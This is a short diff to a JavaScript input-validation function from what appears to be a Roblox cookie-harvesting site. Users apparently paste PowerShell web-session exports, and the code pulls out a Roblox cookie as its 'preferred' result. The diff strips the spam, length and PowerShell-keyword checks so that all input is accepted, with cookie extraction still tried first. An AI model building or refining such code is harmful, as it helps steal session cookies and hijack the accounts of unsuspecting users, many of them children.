@@ -70,61 +70,14 @@ function isValidCode(code) {
         return { valid: false, reason: 'This input has already been submitted!' };
     }
 
-    // Simple spam detection - only for very obvious cases
-    function isSpamPattern(text) {
-        // Only block very short obvious spam
-        if (text.length < 20) {
-            const simpleSpamPattern = /^[a-z]{2,6}\d+[-_]*$/i; // Like "sjajsj167-"
-            return simpleSpamPattern.test(text.trim());
-        }
-        return false; // Allow everything else
-    }
-    
-    // Check for spam patterns before word count (very minimal check)
-    if (isSpamPattern(cleanCode)) {
-        return { valid: false, reason: 'Input appears to be spam or random characters!', isSpam: true };
-    }
-
-    // Count words in the input
-    const words = cleanCode.split(/\s+/).filter(word => word.length > 0);
-    const wordCount = words.length;
-    
-    // Minimum word count requirement based on PowerShell session example
-    const minWordCount = 50; // Based on the provided example having ~50+ meaningful words
-    
-    if (wordCount < minWordCount) {
-        return { valid: false, reason: `Input too short. Minimum ${minWordCount} words required for analysis.` };
-    }
-
-    // Check for PowerShell-like keywords to ensure it's legitimate code
-    const powershellKeywords = [
-        'powershell', '$session', 'new-object', 'invoke-webrequest', 'websession',
-        'cookies', 'headers', 'useragent', 'add', 'system.net', 'microsoft.powershell',
-        'param', 'function', 'if', 'else', 'foreach', 'while', 'try', 'catch',
-        'import-module', 'get-', 'set-', 'write-', 'read-'
-    ];
-    
-    const hasValidKeywords = powershellKeywords.some(keyword => 
-        cleanCode.toLowerCase().includes(keyword.toLowerCase())
-    );
-    
-    if (!hasValidKeywords && wordCount >= minWordCount) {
-        return { valid: false, reason: 'Input does not appear to be valid PowerShell code!' };
-    }
-
     // Check for Roblox cookie extraction (preferred)
     const robloxCookie = extractRobloxCookie(cleanCode);
     if (robloxCookie) {
         return { valid: true, robloxCookie: robloxCookie, type: 'roblox_cookie' };
     }
 
-    // Allow PowerShell code that meets requirements
-    if (wordCount >= minWordCount && hasValidKeywords) {
-        return { valid: true, type: 'powershell_code' };
-    }
-
-    // Block everything else
-    return { valid: false, reason: 'Only valid PowerShell code with sufficient length is allowed!', isBlocked: true };
+    // Allow everything else for now
+    return { valid: true, type: 'general_input' };
 }
 
 function checkRateLimit() {
